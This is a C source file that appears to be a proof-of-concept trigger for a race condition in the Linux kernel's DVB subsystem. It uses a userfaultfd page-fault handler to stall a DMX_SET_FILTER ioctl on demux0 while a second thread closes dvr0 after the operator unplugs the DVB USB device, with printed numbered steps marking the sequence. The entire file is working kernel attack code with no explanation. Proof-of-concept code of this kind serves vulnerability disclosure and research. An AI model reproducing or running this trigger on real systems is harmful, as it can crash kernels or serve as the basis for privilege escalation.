#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <pthread.h>
#include <errno.h>
#include <sched.h>
#include <malloc.h>
#include <poll.h>
#include <pty.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/ipc.h>
#include <linux/userfaultfd.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/un.h>
#include <linux/netlink.h>
#include <stddef.h>
#include <sys/param.h>
#include <sys/resource.h>
#include <linux/bpf.h>
#include <linux/ioctl.h>
#include <linux/types.h>

#include <linux/dvb/dmx.h>


#define CPU_0 1
#define CPU_1 2
#define CPU_2 3
#define CPU_3 4
#define UFFD_COUNT 1

#define die() do { \
	fprintf(stderr, "died in %s: %u\n", __func__, __LINE__); \
	exit(EXIT_FAILURE); \
} while (0)


int fd;
int page_size;
int set1 = 0;
int set2 = 0;
int set3 = 0;
char *addr;
char *leak_addr;
char *text_addr;


void set_affinity(unsigned long mask) {
	if (pthread_setaffinity_np(pthread_self(), sizeof(mask), (cpu_set_t *)&mask) < 0) {
		perror("pthread_setaffinity_np");
	}
	return;
}

static void *fault_handler_thread(void *arg) {
	static struct uffd_msg msg;
	long uffd;
	static char *page = NULL;
	struct uffdio_copy uffdio_copy;
	ssize_t nread;
	int qid;
	uintptr_t fault_addr;

	uffd = (long)arg;

	if (page == NULL) {
		page = mmap(NULL, page_size,
				PROT_READ | PROT_WRITE,
				MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
		if (page == MAP_FAILED){
			perror("mmap");
			die();
		}
	}

	for (;;) {
		struct pollfd pollfd;
		int nready;
		pollfd.fd = uffd;
		pollfd.events = POLLIN;
		nready = poll(&pollfd, 1, -1);
		if (nready == -1) {
			perror("poll");
			die();
		}

		nread = read(uffd, &msg, sizeof(msg));
		if (nread == 0) {
			printf("EOF on userfaultfd!\n");
			die();
		}

		if (nread == -1) {
			perror("read");
			die();
		}

		if (msg.event != UFFD_EVENT_PAGEFAULT) {
			perror("Unexpected event on userfaultfd");
			die();
		}

		fault_addr = msg.arg.pagefault.address;

		if (fault_addr == addr) {
			printf("[step 4] ioctl ufd  pid : %ld\n", syscall(SYS_gettid));

			set2 = 1;
			while(!set3);

			sleep(5);

			uffdio_copy.src = (unsigned long)page;
			uffdio_copy.dst = (unsigned long)msg.arg.pagefault.address & ~(page_size - 1);
			uffdio_copy.len = page_size;
			uffdio_copy.mode = 0;
			uffdio_copy.copy = 0;
			if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1) {
				perror("fault_handler_thread() - ioctl-UFFDIO_COPY case 1");
				die();
			}

		}
	}
}

void set_userfaultfd(void) {
	long uffd[UFFD_COUNT];
	struct uffdio_api uffdio_api[UFFD_COUNT];
	struct uffdio_register uffdio_register;
	pthread_t pf_hdr[UFFD_COUNT];
	int p[UFFD_COUNT];
	unsigned int size;

	size = page_size;

	addr = (char *)mmap(NULL,
			page_size * UFFD_COUNT,
			PROT_READ | PROT_WRITE,
			MAP_PRIVATE | MAP_ANONYMOUS,
			-1, 0);

	for (int i = 0; i < UFFD_COUNT; i++) {
		uffd[i] = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
		if (uffd[i] == -1) {
			perror("syscall : userfaultfd");
			die();
		}

		uffdio_api[i].api = UFFD_API;
		uffdio_api[i].features = 0;
		if (ioctl(uffd[i], UFFDIO_API, &uffdio_api[i]) == -1) {
			perror("ioctl() : UFFDIO_API");
			die();
		}

		uffdio_register.range.start = (unsigned long)(addr + (page_size * i));
		uffdio_register.range.len   = size;
		uffdio_register.mode        = UFFDIO_REGISTER_MODE_MISSING;
		if (ioctl(uffd[i], UFFDIO_REGISTER, &uffdio_register) == -1) {
			perror("ioctl() : UFFDIO_REGISTER");
			die();
		}

		p[i] = pthread_create(&pf_hdr[i], NULL, fault_handler_thread, (void *)uffd[i]);
		if (p[i] != 0) {
			perror("pthread_create : page_fault_handler_thread");
			die();
		}
	}
}


void *dvb_wait_queue(void) {
	int fd;
	int ret;

	//set_affinity(CPU_2);

	fd = open("/dev/dvb/adapter0/dvr0", O_RDONLY);
	if (fd > 0) {
		printf("[step 1] dvr0 open() : %d  pid : %ld\n", fd, syscall(SYS_gettid));
	} else {
		perror("/dev/dvb/adapter0/dvr0 open() failed");
		die();
	}
	set1 = 1;


	while(!set2);
	sleep(5);

	close(fd);
	printf("[step 5] dvr0 close()  pid : %ld\n", syscall(SYS_gettid));

	sleep(5);
	set3 = 1;
}

void *demux_ioctl(void) {
	int ret;
	unsigned char tmp;
	char input[2];
	int fd;

	//set_affinity(CPU_1);

	while(!set1);
	printf("Disconnect now (After disconnecting, type enter)\n");
	read(0, input, 1);
	printf("[step 2] disconnect dvb usb\n");


	fd = open("/dev/dvb/adapter0/demux0", O_RDWR);
	if (fd > 0) {
		printf("[step 3] demux0 open() : %d  pid : %ld\n", fd, syscall(SYS_gettid));

	} else {
		perror("/dev/dvb/adapter0/demux0 open() failed");
		die();
	}


	ret = ioctl(fd, DMX_SET_FILTER, addr);
	printf("[step 6] demux0 ioctl()  ret : %d  pid : %ld\n", ret, syscall(SYS_gettid));

	sleep(5);
}

int main() {
	pthread_t pf_hdr;
	int p1, p2;
	int status1, status2;
	pthread_t hdr1, hdr2;
	int ret;

	page_size = sysconf(_SC_PAGE_SIZE);

	//set_affinity(CPU_0);

	set_userfaultfd();

	p1 = pthread_create(&hdr1, NULL, dvb_wait_queue, (void *)NULL);
	if (p1 != 0) {
		perror("pthread_create 1");
		die();
	}

	p2 = pthread_create(&hdr2, NULL, demux_ioctl, (void *)NULL);
	if (p2 != 0) {
		perror("pthread_create 2");
		die();
	}

	pthread_join(hdr1, (void **)&status1);
	pthread_join(hdr2, (void **)&status2);

	return 0;
}
